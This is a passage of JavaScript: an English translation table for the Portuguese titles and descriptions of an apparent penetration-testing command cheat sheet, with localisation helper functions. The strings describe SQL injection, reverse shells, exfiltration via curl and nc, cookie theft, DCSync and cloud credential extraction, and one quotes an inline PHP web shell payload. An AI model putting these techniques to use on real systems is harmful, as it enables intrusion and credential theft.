  "Baixar registros e quebrar hashes de senha de uma tabela": "Download rows and crack password hashes from a table",
  "Burlar filtros que realizam apenas uma rodada de URL decode": "Bypass filters that perform only a single round of URL decode",
  "Burlar formul\u00e1rios de login cl\u00e1ssicos em consultas SQL n\u00e3o preparadas": "Bypass classic login forms in unprepared SQL queries",
  "Busca alternativa para arquivos SUID em todo o sistema de arquivos descartando erros de permiss\u00e3o.": "Alternate search for SUID files across the filesystem, discarding permission errors.",
  "Busca bin\u00e1rios com capacidades como cap_setuid, cap_net_raw ou cap_dac_override para escalonamento.": "Search binaries with capabilities like cap_setuid, cap_net_raw or cap_dac_override for escalation.",
  "Bypass de autentica\u00e7\u00e3o e consulta de tabelas": "Authentication bypass and table enumeration",
  "Bypass de restri\u00e7\u00e3o de IP de rede interna ou painel admin": "Bypass of internal network IP restriction or admin panel",
  "Bypassa logins onde a consulta utiliza WHERE (username = '...' AND password = '...').": "Bypasses logins where the query uses WHERE (username = '...' AND password = '...').",
  "Coleta a lista completa de bases de dados acessíveis.": "Collects the full list of accessible databases.",
  "Coleta secrets em base64 armazenados no cluster Kubernetes.": "Collects base64 secrets stored in the Kubernetes cluster.",
  "Coletar todo o grafo de permissões, sessões e ACLs do domínio": "Collect the full permission graph, sessions and ACLs of the domain",
  "Coletar vers\u00e3o, usu\u00e1rio ativo e nome do banco atual": "Collect version, active user and current database name",
  "Comando essencial para decidir vetor de privilege escalation (ex: JuicyPotato / GodPotato).": "Essential command to pick a privilege escalation vector (e.g. JuicyPotato / GodPotato).",
  "Comando executado no terminal local ap\u00f3s colocar o shell em background com Ctrl+Z para restaurar modo raw.": "Command run in the local terminal after backgrounding the shell with Ctrl+Z to restore raw mode.",
  "Coment\u00e1rios em bloco ou inline bypass de espa\u00e7os": "Block or inline comments as a space bypass",
  "Comenta o restante da query ap\u00f3s especificar o usu\u00e1rio alvo.": "Comments out the rest of the query after specifying the target user.",
  "Compara a resposta da aplica\u00e7\u00e3o quando a condi\u00e7\u00e3o injetada \u00e9 verdadeira.": "Compares the application response when the injected condition is true.",
  "Configura terminal virtual interativo para suporte a comandos como su e sudo.": "Sets up an interactive virtual terminal with support for commands like su and sudo.",
  "Consulta a tabela de metadados sqlite_master para mapear colunas e tabelas.": "Queries the sqlite_master metadata table to map columns and tables.",
  "Consulta information_schema.tables para listar tabelas do banco de dados atual.": "Queries information_schema.tables to list tables of the current database.",
  "Cookies sem HttpOnly podem ser lidos via XSS; sem Secure podem vazar em HTTP puro.": "Cookies without HttpOnly can be read via XSS; without Secure they may leak over plain HTTP.",
  "Copia arquivos entre hosts utilizando autentica\u00e7\u00e3o SSH existente.": "Copies files between hosts using existing SSH authentication.",
  "Copia recursivamente arquivos do bucket para diretório local.": "Recursively copies bucket files to a local directory.",
  "Copia um arquivo da máquina remota para a pasta atual do atacante.": "Copies a file from the remote machine to the attacker current folder.",
  "Copiar arquivos quando o SSH roda em porta não padrão": "Copy files when SSH runs on a non-standard port",
  "Cria uma VPN sobre SSH encaminhando todo o tráfego da rede \" + pivnet + \".": "Creates a VPN over SSH forwarding all traffic of the network \\\" + pivnet + \\\".",
  "Criar chave privada e pública sem senha para persistência": "Create a passwordless private and public key for persistence",
  "Criar pseudo-terminal interativo a partir de um shell burro": "Create an interactive pseudo-terminal from a dumb shell",
  "Criar rota para redes e subredes internas": "Create a route to internal networks and subnets",
  "Decodifica string base64 em runtime e passa direto para o shell sh.": "Decodes a base64 string at runtime and pipes it straight to the sh shell.",
  "Descoberta rápida e recursiva de diretórios em Rust": "Fast recursive directory discovery in Rust",
  "Despeja todo o conteúdo da tabela users incluindo hashes de senha.": "Dumps the whole users table content including password hashes.",
  "Determinar o n\u00famero exato de colunas retornadas pela query original": "Determine the exact number of columns returned by the original query",
  "Encaminha porta remota do host ou de host interno para o localhost do atacante.": "Forwards a remote port from the host or an internal host to the attacker localhost.",
  "Encaminha tr\u00e1fego de rede para alcan\u00e7ar segmentos internos n\u00e3o rote\u00e1veis diretamente.": "Forwards network traffic to reach internal segments that are not directly routable.",
  "Endere\u00e7o link-local do servi\u00e7o de metadados em inst\u00e2ncias EC2.": "Link-local address of the metadata service on EC2 instances.",
  "Enumera armazenamento de arquivos onde frequentemente residem backups e credenciais.": "Enumerates file storage where backups and credentials often reside.",
  "Enumera\u00e7\u00e3o de sistema e privil\u00e9gios locais": "System and local privilege enumeration",
  "Envia arquivo local (ex: linpeas.sh) para o diretório /tmp da vítima.": "Sends a local file (e.g. linpeas.sh) to the victim /tmp directory.",
  "Envia um cabe\u00e7alho Host arbitr\u00e1rio para verificar se a aplica\u00e7\u00e3o reflete em links gerados.": "Sends an arbitrary Host header to check whether the application reflects it in generated links.",
  "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando ": "Establishes a reverse TCP connection to the listener at {{LHOST}}:{{LPORT}} using ",
  "Examina agendamentos de tarefas locais, scripts em /etc/cron* e tarefas do sistema para identificar scripts vulner\u00e1veis.": "Inspects local task schedules, scripts in /etc/cron* and system jobs to spot vulnerable scripts.",
  "Examina ~/.ssh/authorized_keys e outros arquivos de configuração para descobrir quem tem acesso SSH.": "Inspects ~/.ssh/authorized_keys and other config files to discover who has SSH access.",
  "Executa sqlmap em modo não interativo (--batch) contra o alvo.": "Runs sqlmap in non-interactive mode (--batch) against the target.",
  "Executar comando no host a partir de container privileged": "Run a host command from a privileged container",
  "Executar comandos arbitrários ofuscados para escapar de filtros de caracteres especiais": "Run obfuscated arbitrary commands to escape special-character filters",
  "Executar comandos do sistema operacional atrav\u00e9s de subclasses do Python": "Run operating system commands through Python subclasses",
  "Executar comandos do sistema operacional em aplicações Spring": "Run operating system commands in Spring applications",
  "Executar comandos em endpoint vulner\u00e1vel": "Run commands on a vulnerable endpoint",
  "Executar comandos quando a aplicação bloqueia espaços ou quebras de linha": "Run commands when the application blocks spaces or line breaks",
  "Exfil - curl POST arquivo": "Exfil - curl POST file",
  "Exfil - nc < arquivo": "Exfil - nc < file",
  "Exibir a assinatura e locat\u00e1rio (Tenant) autenticados": "Show the authenticated subscription and tenant",
  "Explora configuração 'location /static { alias /var/www/static/; }' permitindo ler /static../app.py.": "Exploits the 'location /static { alias /var/www/static/; }' config, allowing reads of /static../app.py.",
  "Extrair credenciais de IAM Role associada \u00e0 m\u00e1quina virtual": "Extract IAM Role credentials attached to the virtual machine",
  "Extrair hashes NTLM de todos os usuários do domínio via protocolo DRSR": "Extract NTLM hashes of all domain users via the DRSR protocol",
  "Extrair senhas e comandos digitados anteriormente pelo administrador": "Extract passwords and previously typed commands from the administrator",
  "Extrair tokens de autentica\u00e7\u00e3o, senhas e certificados em todos os namespaces": "Extract authentication tokens, passwords and certificates in all namespaces",
  "Fazer upload de backdoor SQL para obter shell do sistema operacional": "Upload a SQL backdoor to get an operating system shell",
  "Ferramenta de alta concorrência com auto-tune de requisições.": "High-concurrency tool with request auto-tuning.",
  "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.": "Tool for user, computer and permission reconnaissance in Active Directory.",
  "Filtra pelo banco especificado e extrai todas as tabelas.": "Filters by the given database and extracts all tables.",
  "For\u00e7a a cl\u00e1usula WHERE a retornar verdadeiro para todos os registros.": "Forces the WHERE clause to return true for all rows.",
  "For\u00e7ar atraso na resposta para confirmar execu\u00e7\u00e3o de c\u00f3digo SQL": "Force a response delay to confirm SQL code execution",
  "For\u00e7ar convers\u00e3o de tipo para vazar dados na mensagem de erro do banco": "Force type conversion to leak data in the database error message",
  "Fun\u00e7\u00e3o nativa para leitura de arquivos no diret\u00f3rio de dados ou sistema.": "Native function to read files from the data or system directory.",
  "Fun\u00e7\u00f5es fundamentais para reconhecimento de ambiente MySQL.": "Core functions for MySQL environment reconnaissance.",
  "Fuzzing de alta velocidade para descoberta de arquivos e rotas ocultas": "High-speed fuzzing for hidden file and route discovery",
  "Gera arquivo ZIP para importação direta na interface do BloodHound.": "Generates a ZIP file for direct import into the BloodHound UI.",
  "Gera um par de chaves RSA de 2048 bits sem passphrase em /tmp/id_rsa.": "Generates a 2048-bit RSA key pair without passphrase at /tmp/id_rsa.",
  "Habilita configura\u00e7\u00f5es avan\u00e7adas e executa comandos cmd.exe com privil\u00e9gio do servi\u00e7o MSSQL.": "Enables advanced settings and runs cmd.exe commands with MSSQL service privileges.",
  "Identifica contas de servi\u00e7o que utilizam senhas fracas cracke\u00e1veis offline.": "Identifies service accounts using weak offline-crackable passwords.",
  "Identifica diret\u00f3rios tempor\u00e1rios ou de aplica\u00e7\u00e3o onde \u00e9 poss\u00edvel dropar scripts e execut\u00e1veis.": "Identifies temp or application directories where scripts and executables can be dropped.",
  "Identificar OS, arquitetura, usu\u00e1rio atual e privil\u00e9gios sudo": "Identify OS, architecture, current user and sudo privileges",
  "Identificar o usu\u00e1rio, ARN e conta AWS da credencial em uso": "Identify the user, ARN and AWS account of the credential in use",
  "Incremente o n\u00famero at\u00e9 ocorrer erro para identificar a quantidade de colunas.": "Increment the number until an error occurs to identify the column count.",
  "Inicializa um PTY usando Python para permitir execu\u00e7\u00e3o de comandos interativos como su, passwd e sudo.": "Initializes a PTY using Python to allow interactive commands like su, passwd and sudo.",
  "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.": "Injects operators and comments to alter SQL query logic.",
  "Injetar código PHP inline em base64 sem hospedar servidor remoto": "Inject inline base64 PHP code without hosting a remote server",
  "Inspecionar capacidades POSIX em execut\u00e1veis": "Inspect POSIX capabilities on executables",
  "Inspecionar chaves públicas autorizadas para login": "Inspect authorized public keys for login",
  "Kubernetes - Listar Secrets do Cluster": "Kubernetes - List Cluster Secrets",
  "L\u00ea arquivos locais caso o usu\u00e1rio do banco tenha permiss\u00e3o e secure_file_priv permita.": "Reads local files if the DB user is allowed and secure_file_priv permits.",
  "L\u00ea o arquivo ConsoleHost_history.txt onde o hist\u00f3rico do PSReadline fica gravado.": "Reads ConsoleHost_history.txt where the PSReadline history is stored.",
  "Ler arquivos do sistema operacional quando FILE privilege est\u00e1 ativo": "Read operating system files when FILE privilege is active",
  "Ler o arquivo de hosts do Windows para confirmar a vulnerabilidade": "Read the Windows hosts file to confirm the vulnerability",
  "Linux - Arquivos Grav\u00e1veis por Qualquer Usu\u00e1rio": "Linux - World-Writable Files",
  "Linux - Crontab do Usu\u00e1rio e Sistema": "Linux - User and System Crontab",
  "Linux - Diret\u00f3rios Grav\u00e1veis Globais": "Linux - Globally Writable Directories",
  "Linux - Download de Arquivo via SCP": "Linux - File Download via SCP",
  "Linux - Enumera\u00e7\u00e3o B\u00e1sica de Sistema": "Linux - Basic System Enumeration",
  "Linux - Executar Comando com Proxychains": "Linux - Run Command with Proxychains",
  "Linux - Gerar Par de Chaves SSH": "Linux - Generate SSH Key Pair",
  "Linux - SOCKS Proxy Dinâmico (SSH -D)": "Linux - Dynamic SOCKS Proxy (SSH -D)",
  "Linux - SSH Conexão com Chave Privada": "Linux - SSH Connection with Private Key",
  "Linux - Transfer\u00eancia de Arquivo via SCP": "Linux - File Transfer via SCP",
  "Lista execut\u00e1veis pertencentes ao root que rodam com privil\u00e9gios elevados. \u00datil para verificar GTFOBins.": "Lists root-owned executables running with elevated privileges. Useful to check GTFOBins.",
  "Lista todos os resource groups da assinatura ativa.": "Lists all resource groups of the active subscription.",
  "Listar Service Principal Names (SPNs) vulner\u00e1veis a Kerberoast": "List Service Principal Names (SPNs) vulnerable to Kerberoast",
  "Listar tabelas de uma base específica": "List tables of a specific database",
  "Listar timers ativos do systemd que substituem o cron tradicional": "List active systemd timers replacing traditional cron",
  "Listar todas as a\u00e7\u00f5es que a conta de servi\u00e7o atual tem permiss\u00e3o de executar": "List all actions the current service account is allowed to run",
  "Localizar arquivos com SUID usando sintaxe u=s": "Locate SUID files using u=s syntax",
  "Localizar arquivos com permiss\u00e3o de escrita para everyone": "Locate files writable by everyone",
  "Localizar bin\u00e1rios com bit SGID (execu\u00e7\u00e3o como grupo propriet\u00e1rio)": "Locate binaries with the SGID bit (run as owning group)",
  "Localizar bin\u00e1rios com bit SUID configurado": "Locate binaries with the SUID bit set",
  "Localizar pastas globais com permiss\u00e3o de escrita para cria\u00e7\u00e3o de artefatos": "Locate global folders with write permission for artifact creation",
  "Localizar serviços com caminhos não entre aspas que permitam binário falso": "Locate services with unquoted paths allowing a fake binary",
  "Lê o token que permite autenticação contra a API do Kubernetes.": "Reads the token that allows authentication against the Kubernetes API.",
  "Mapear grupos de recursos e regiões onde a organização opera": "Map resource groups and regions where the organization operates",
  "Mostra servi\u00e7os e timers configurados para execu\u00e7\u00e3o autom\u00e1tica pelo systemd.": "Shows services and timers configured for automatic execution by systemd.",
  "Navega pelas subclasses do Python para instanciar subprocess.Popen ou os.popen.": "Walks Python subclasses to instantiate subprocess.Popen or os.popen.",
  "O PHP no Windows trata compartilhamentos SMB (\\\\ip\\share) como arquivos locais.": "PHP on Windows treats SMB shares (\\\\\\\\ip\\\\share) as local files.",
  "O interpretador Bash avalia o conte\u00fado interno do subshell antes de executar o comando principal.": "The Bash interpreter evaluates the subshell inner content before running the main command.",
  "Permite controlar a daemon do Docker via curl ou docker CLI sem autentica\u00e7\u00e3o.": "Allows controlling the Docker daemon via curl or the docker CLI without authentication.",
  "Permite criar bin\u00e1rios falsos (ex: curl, tar) em diret\u00f3rios priorit\u00e1rios no PATH que possam ser chamados por scripts root.": "Allows creating fake binaries (e.g. curl, tar) in higher-priority PATH directories that root scripts may call.",
  "Permite tunelar ferramentas como proxychains, browser e nmap atrav\u00e9s do host comprometido.": "Allows tunneling tools like proxychains, browser and nmap through the compromised host.",
  "Permite usar proxychains ou o navegador para navegar por toda a rede interna do alvo.": "Allows using proxychains or the browser to browse the whole target internal network.",
  "Pivot - Ligolo rota p/ rede": "Pivot - Ligolo route to network",
  "Pode ser utilizado para bypass de filtros que bloqueiam espa\u00e7os (ex: SELECT/**/user).": "Can be used to bypass filters blocking spaces (e.g. SELECT/**/user).",
  "Preenche as colunas com NULL para verificar onde os dados podem ser refletidos.": "Fills columns with NULL to check where data is reflected.",
  "Procura arquivos de chaves SSH em diret\u00f3rios de usu\u00e1rios, backups e pastas tempor\u00e1rias.": "Searches SSH key files in user directories, backups and temp folders.",
  "Procura bin\u00e1rios que executam com privil\u00e9gios de grupo (ex: grupo shadow, disk, etc.).": "Searches binaries running with group privileges (e.g. shadow, disk groups).",
  "Procura serviços configurados como Auto que não usam aspas em caminhos com espaços.": "Searches services set to Auto that use unquoted paths with spaces.",
  "Provoca erro de convers\u00e3o revelando o resultado da subquery no log de erro exibido na p\u00e1gina.": "Triggers a conversion error revealing the subquery result in the error log shown on the page.",
  "RCE - bypass de espaco ${IFS}": "RCE - space bypass ${IFS}",
  "RCE - separador ;": "RCE - separator ;",
  "Redirecionar sa\u00edda e encadear comando arbitr\u00e1rio": "Redirect output and chain an arbitrary command",
  "Requer o cabe\u00e7alho obrigat\u00f3rio Metadata: true para mitigar SSRF simples.": "Requires the mandatory Metadata: true header to mitigate naive SSRF.",
  "Requer privilégios de DCSync (membro de Domain Admins ou direitos de replicação).": "Requires DCSync privileges (Domain Admins member or replication rights).",
  "Requisita apenas os headers de resposta HTTP para verificar prote\u00e7\u00f5es contra clickjacking, MIME sniffing e XSS.": "Requests only HTTP response headers to check protections against clickjacking, MIME sniffing and XSS.",
  "Retroceder diret\u00f3rios para ler o arquivo de contas do Linux": "Walk directories back to read the Linux account file",
  "Retroceder pasta raiz de alias em servidores Nginx configurados sem barra final": "Walk back the alias root folder on Nginx servers configured without a trailing slash",
  "Roda comandos TCP através do túnel configurado em /etc/proxychains4.conf.": "Runs TCP commands through the tunnel configured in /etc/proxychains4.conf.",
  "Roteamento transparente da subnet interna sem instalar binários no alvo": "Transparent routing of the internal subnet without installing binaries on the target",
  "SQLi - Auth Bypass com Par\u00eanteses": "SQLi - Auth Bypass with Parentheses",
  "SQLi - Coment\u00e1rio Dash Dash (-- -)": "SQLi - Dash-Dash Comment (-- -)",
  "SQLi - Coment\u00e1rio Hash (#)": "SQLi - Hash Comment (#)",
  "SQLi - Coment\u00e1rio Multilinha (/* ... */)": "SQLi - Multiline Comment (/* ... */)",
  "SQLi - DBMS MySQL (Vers\u00e3o, Usu\u00e1rio e DB)": "SQLi - DBMS MySQL (Version, User and DB)",
  "SQLi - DBMS PostgreSQL (Vers\u00e3o e Usu\u00e1rio)": "SQLi - DBMS PostgreSQL (Version and User)",
  "S\u00edmbolo de coment\u00e1rio em linha \u00fanica no MySQL/MariaDB (usar %23 em URLs).": "Single-line comment symbol in MySQL/MariaDB (use %23 in URLs).",
  "Se Access-Control-Allow-Origin refletir evil.com com Allow-Credentials: true, há roubo de dados.": "If Access-Control-Allow-Origin reflects evil.com with Allow-Credentials: true, data theft is possible.",
  "Se a resposta demorar 5 segundos, confirma a vulnerabilidade sem necessidade de retorno visual de dados.": "If the response takes 5 seconds, it confirms the vulnerability with no need for visual data output.",
  "Se a resposta renderizar 49 em vez do texto bruto {{7*7}}, o template engine est\u00e1 executando c\u00f3digo.": "If the response renders 49 instead of the raw {{7*7}} text, the template engine is executing code.",
  "Se o usu\u00e1rio atual pertencer ao grupo docker, executa um container montando o sistema de arquivos do host.": "If the current user belongs to the docker group, run a container mounting the host filesystem.",
  "Separador de instru\u00e7\u00f5es em ambientes Linux/Unix": "Statement separator in Linux/Unix environments",
  "Sequ\u00eancia cl\u00e1ssica de diret\u00f3rios pai para alcan\u00e7ar o diret\u00f3rio raiz.": "Classic parent-directory sequence to reach the root directory.",
  "Sincronizar e baixar todos os arquivos de um bucket S3": "Sync and download all files from an S3 bucket",
  "Substitui a palavra FUZZ pela wordlist recursivamente filtrando c\u00f3digos de erro.": "Replaces the FUZZ keyword with the wordlist, recursively filtering error codes.",
  "Testar compatibilidade de tipos e reflex\u00e3o em tela": "Test type compatibility and on-screen reflection",
  "Testar parâmetro vulnerável e extrair banner do banco": "Test a vulnerable parameter and extract the DB banner",
  "Testar reflex\u00e3o de script no cliente": "Test client-side script reflection",
  "Testar template engine Twig em aplica\u00e7\u00f5es PHP / Symfony": "Test the Twig template engine in PHP / Symfony applications",
  "Testar vulnerabilidade de envenenamento de cache ou reset de senha": "Test cache poisoning or password reset vulnerability",
  "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.": "Moves data over ICMP, DNS or HTTP to test data-loss prevention controls.",
  "Transferir binário ou script para /tmp no host remoto": "Transfer a binary or script to /tmp on the remote host",
  "Tunelar varredura ou exploração através do proxy SOCKS": "Tunnel scanning or exploitation through the SOCKS proxy",
  "Upload bypass - extensoes": "Upload bypass - extensions",
  "Usa a variável interna do shell IFS (Internal Field Separator) como substituto de espaço.": "Uses the shell internal IFS variable (Internal Field Separator) as a space substitute.",
  "Usa contra-barras duplas para navegar até C:\\Windows\\System32\\drivers\\etc\\hosts.": "Uses double backslashes to navigate to C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts.",
  "Usa o parâmetro -P maiúsculo para especificar a porta do daemon SSH.": "Uses the uppercase -P flag to specify the SSH daemon port.",
  "Usa o wrapper data:// para passar payload <?php system($_GET['c']); ?> diretamente na URL.": "Uses the data:// wrapper to pass the payload <?php system($_GET['c']); ?> straight in the URL.",
  "Utiliza a feature release_agent do cgroup para disparar script no host pai.": "Uses the cgroup release_agent feature to trigger a script on the parent host.",
  "Utiliza a fun\u00e7\u00e3o nativa pg_sleep para atrasar a resposta em segundos.": "Uses the native pg_sleep function to delay the response by seconds.",
  "Utiliza a instru\u00e7\u00e3o WAITFOR DELAY para pausar a execu\u00e7\u00e3o da consulta.": "Uses the WAITFOR DELAY statement to pause query execution.",
  "Utiliza injeção para subir um stager de comando no servidor web ou banco.": "Uses injection to upload a command stager to the web server or database.",
  "Utiliza o comando nativo net.exe para consultar o cat\u00e1logo do dom\u00ednio.": "Uses the native net.exe command to query the domain catalog.",
  "Utiliza pipe para passar resultado ao pr\u00f3ximo comando executado pelo shell.": "Uses a pipe to pass output to the next command run by the shell.",
  "Utiliza updatexml ou extractvalue no MySQL para refletir dados na resposta de erro.": "Uses updatexml or extractvalue in MySQL to reflect data in the error response.",
  "Verifica permiss\u00f5es de arquivos e bin\u00e1rios para identificar vetores de eleva\u00e7\u00e3o de privil\u00e9gios.": "Checks file and binary permissions to identify privilege escalation vectors.",
  "Verifica se a ServiceAccount atual tem permiss\u00e3o para criar pods ou listar secrets.": "Checks whether the current ServiceAccount may create pods or list secrets.",
  "Verifica se arquivos de configura\u00e7\u00e3o (/etc/passwd, /etc/sudoers, scripts .sh) est\u00e3o com permiss\u00e3o indevida de escrita.": "Checks whether config files (/etc/passwd, /etc/sudoers, .sh scripts) have improper write permission.",
  "Verificar buckets S3 acess\u00edveis na conta": "Check S3 buckets accessible in the account",
  "Verificar presença de flags HttpOnly, Secure e SameSite nos cookies": "Check for HttpOnly, Secure and SameSite flags on cookies",
  "Verificar se a aplicação reflete cabeçalho Origin arbitrário": "Check whether the application reflects an arbitrary Origin header",
  "Verificar se algum diret\u00f3rio do PATH permite escrita": "Check whether any PATH directory is writable",
  "Verificar se instaladores MSI rodam como NT AUTHORITY\\SYSTEM": "Check whether MSI installers run as NT AUTHORITY\\\\SYSTEM",
  "Verificar se o docker.sock est\u00e1 exposto para comunica\u00e7\u00e3o direta": "Check whether docker.sock is exposed for direct communication",
  "Verificar se tokens SeImpersonatePrivilege ou SeDebugPrivilege est\u00e3o ativos": "Check whether SeImpersonatePrivilege or SeDebugPrivilege tokens are active",
  "Web - Automa\u00e7\u00e3o SQLi com sqlmap": "Web - SQLi Automation with sqlmap",
  "Web - Command Injection (Bypass de Espaço ${IFS})": "Web - Command Injection (Space Bypass ${IFS})",
  "Web - Enumeração de Endpoints de API": "Web - API Endpoint Enumeration",
  "Web - Fuzzing de Diret\u00f3rios com ffuf": "Web - Directory Fuzzing with ffuf",
  "Web - Fuzzing de Rotas com Feroxbuster": "Web - Route Fuzzing with Feroxbuster",
  "XSS - roubo de cookie via IMG": "XSS - cookie theft via IMG",
  "sqlmap - Detecção e Banner do DBMS": "sqlmap - DBMS Detection and Banner",
  "sqlmap - Dump de Tabela de Usuários": "sqlmap - Users Table Dump",
  "sqlmap - Listar Tabelas de um Banco": "sqlmap - List Tables of a Database",
  "sqlmap - Listar Todos os Bancos de Dados": "sqlmap - List All Databases",
  "sqlmap - dump tabela users": "sqlmap - dump users table",
  "AD - NetExec SMB sessao nula": "AD - NetExec SMB null session",
  "AD - NetExec SMB users/grupos/politica": "AD - NetExec SMB users/groups/policy",
  "AWS - Identidade Atual (sts get-caller-identity)": "AWS - Current Identity (sts get-caller-identity)",
  "AWS - Metadados de Inst\u00e2ncia EC2 (IMDSv1)": "AWS - EC2 Instance Metadata (IMDSv1)",
  "Auditar permiss\u00f5es e configura\u00e7\u00f5es locais": "Audit local permissions and settings",
  "Auditoria de seguran\u00e7a em dom\u00ednio Windows": "Windows domain security audit",
  "Automatizar teste de inje\u00e7\u00e3o SQL e extra\u00e7\u00e3o de bancos de dados": "Automate SQL injection testing and database extraction",
  "Azure - Conta Ativa (az account show)": "Azure - Active Account (az account show)",
  "Azure - Metadados de Inst\u00e2ncia VM (IMDS)": "Azure - VM Instance Metadata (IMDS)",
  "Burlar restri\u00e7\u00e3o de allow_url_include no Windows usando caminho UNC": "Bypass the allow_url_include restriction on Windows using a UNC path",
  "Checar vers\u00e3o e se a sess\u00e3o atual \u00e9 membro da role sysadmin": "Check the version and whether the current session is a sysadmin role member",
  "Comentar o restante da consulta SQL em MySQL, MSSQL e PostgreSQL": "Comment out the rest of the SQL query in MySQL, MSSQL and PostgreSQL",
  "Conex\u00e3o Reversa TCP": "Reverse TCP Connection",
  "Confirmar altera\u00e7\u00e3o de comportamento em resposta falsa": "Confirm a behavior change on a false response",
  "Confirmar avalia\u00e7\u00e3o de express\u00f5es em templates Jinja2 / Flask": "Confirm expression evaluation in Jinja2 / Flask templates",
  "Confirmar vulnerabilidade cega baseada em resposta booleana verdadeira": "Confirm a blind vulnerability based on a true boolean response",
  "Cred capture - servidor logger Python": "Cred capture - Python logger server",
  "Descobrir servi\u00e7os locais escutando apenas em 127.0.0.1": "Discover local services listening only on 127.0.0.1",
  "Docker - Checar Permiss\u00e3o no Socket Docker": "Docker - Check Permission on the Docker Socket",
  "Estabilizar terminal e habilitar controle de jobs": "Stabilize the terminal and enable job control",
  "Exfil - tar + nc (diretorio)": "Exfil - tar + nc (directory)",
  "Extrair a vers\u00e3o e todas as instru\u00e7\u00f5es CREATE TABLE do SQLite": "Extract the version and all SQLite CREATE TABLE statements",
  "Extrair caracteres individuais de strings do banco caractere por caractere": "Extract individual characters from DB strings character by character",
  "Extrair nomes de tabelas existentes no banco de dados": "Extract existing table names from the database",
  "Finaliza o comando original e executa o comando injetado subsequentemente.": "Terminates the original command and runs the injected command right after.",
  "For\u00e7ar atraso em consultas do SQL Server": "Force a delay in SQL Server queries",
  "For\u00e7ar pausa em bancos PostgreSQL": "Force a pause in PostgreSQL databases",
  "Fun\u00e7\u00f5es nativas de sistema do PostgreSQL.": "Native PostgreSQL system functions.",
  "Habilitar Ctrl+C, hist\u00f3rico e auto-completar no shell reverso": "Enable Ctrl+C, history and auto-complete in the reverse shell",
  "Identifica bancos de dados, portas de debug e webapps internas n\u00e3o expostas externamente.": "Identifies databases, debug ports and internal webapps not exposed externally.",
  "Identificar contas privilegiadas de administra\u00e7\u00e3o do dom\u00ednio": "Identify privileged domain administration accounts",
  "Identificar detalhes de vers\u00e3o e privil\u00e9gios no PostgreSQL": "Identify version details and privileges in PostgreSQL",
  "Incluir script PHP hospedado no servidor do atacante": "Include a PHP script hosted on the attacker server",
  "Inspecionar cabe\u00e7alhos de seguran\u00e7a (CSP, HSTS, X-Frame-Options, CORS)": "Inspect security headers (CSP, HSTS, X-Frame-Options, CORS)",
  "Kubernetes - Auditoria de Permiss\u00f5es RBAC": "Kubernetes - RBAC Permission Audit",
  "Ler arquivos do servidor via superuser ou pg_read_server_files": "Read server files via superuser or pg_read_server_files",
  "Ler arquivos locais atrav\u00e9s de par\u00e2metros web": "Read local files through web parameters",
  "Linux - Diret\u00f3rios Writable no $PATH": "Linux - Writable Directories in $PATH",
  "Linux - Portas em Escuta e Conex\u00f5es (ss / netstat)": "Linux - Listening Ports and Connections (ss / netstat)",
  "Linux - Proxy Din\u00e2mico SOCKS via SSH (-D)": "Linux - Dynamic SOCKS Proxy via SSH (-D)",
  "O espa\u00e7o ap\u00f3s o segundo tra\u00e7o \u00e9 obrigat\u00f3rio no padr\u00e3o ANSI SQL.": "The space after the second dash is mandatory in the ANSI SQL standard.",
  "Primeiro comando ap\u00f3s obter chaves AWS (AKIA / ASIA).": "First command after obtaining AWS keys (AKIA / ASIA).",
  "Quebrar consultas SQL encapsuladas em par\u00eanteses": "Break SQL queries wrapped in parentheses",
  "RCE - quebra de linha %0a": "RCE - line break %0a",
  "SQLi - DBMS MSSQL (Vers\u00e3o e SysAdmin Check)": "SQLi - DBMS MSSQL (Version and SysAdmin Check)",
  "SQLi - DBMS SQLite (Vers\u00e3o e Schema)": "SQLi - DBMS SQLite (Version and Schema)",
  "Se IS_SRVROLEMEMBER('sysadmin') retornar 1, \u00e9 poss\u00edvel habilitar xp_cmdshell.": "If IS_SRVROLEMEMBER('sysadmin') returns 1, xp_cmdshell can be enabled.",
  "Se a resposta diferir da condi\u00e7\u00e3o verdadeira, confirma a presen\u00e7a de Boolean Blind SQLi.": "If the response differs from the true condition, it confirms a Boolean Blind SQLi.",
  "Simula requisi\u00e7\u00e3o originada do localhost (127.0.0.1) atrav\u00e9s de cabe\u00e7alhos de proxy reverso.": "Simulates a request originated from localhost (127.0.0.1) through reverse proxy headers.",
  "Simular sa\u00edda de dados por canais alternativos": "Exfiltrate data through alternate channels",
  "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.": "Tests input filters and command validation on the server.",
  "Testa par\u00e2metros do alvo e extrai a lista de schemas dispon\u00edveis.": "Tests target parameters and extracts the list of available schemas.",
  "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.": "Tests file path sanitization in inclusion parameters.",
  "Testa se o primeiro caractere da vers\u00e3o do banco corresponde ao caractere testado.": "Tests whether the first character of the DB version matches the tested character.",
  "Transfer\u00eancia de arquivos em ambiente de laborat\u00f3rio": "File transfer in a lab environment",
  "Ver tarefas agendadas em execu\u00e7\u00e3o peri\u00f3dica": "Check scheduled tasks running periodically",
  "Verifica execu\u00e7\u00e3o de express\u00f5es em templates Twig.": "Checks expression execution in Twig templates.",
  "Verifica informa\u00e7\u00f5es da conta Azure conectada via Azure CLI.": "Checks the Azure account info connected via Azure CLI.",
  "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.": "Checks whether special characters (<, >, quotes) are properly encoded in the HTML response.",
  "Windows - Hist\u00f3rico do PowerShell": "Windows - PowerShell History",
  "Windows - Privil\u00e9gios e Grupos Atuais": "Windows - Current Privileges and Groups",
};

var I18N_KEYS = Object.keys(I18N_EN).sort(function(a, b) { return b.length - a.length; });
function Lstr(s, lang) {
  if (s === undefined || s === null || lang === "pt-BR") return s;
  var out = String(s);
  for (var i = 0; i < I18N_KEYS.length; i++) {
    var k = I18N_KEYS[i];
    if (out.indexOf(k) >= 0) out = out.split(k).join(I18N_EN[k]);
  }
  return out;
}
function localizeList(list, lang) {
  if (!list || !list.length || lang === "pt-BR") return list;
  return list.map(function(item) {
    var c = {};
    for (var k in item) c[k] = item[k];
    if (item.title !== undefined) c.title = Lstr(item.title, lang);
    if (item.purpose !== undefined) c.purpose = Lstr(item.purpose, lang);
